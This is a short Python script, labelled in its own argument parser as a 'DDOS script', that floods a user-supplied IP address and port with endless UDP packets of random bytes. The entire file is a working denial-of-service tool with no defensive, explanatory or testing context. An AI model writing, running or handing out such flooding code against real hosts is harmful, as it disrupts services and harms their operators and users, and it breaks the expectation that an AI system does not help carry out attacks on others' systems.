import socket
import random
import argparse

def flood(target_ip, target_port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 1)

    while True:
        sock.sendto(random._urandom(1024), (target_ip, target_port))

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='DDOS script')
    parser.add_argument('--ddos', dest='target_ip', required=True)
    parser.add_argument('--port', dest='target_port', default=80, type=int)
    args = parser.parse_args()

    flood(args.target_ip, args.target_port)
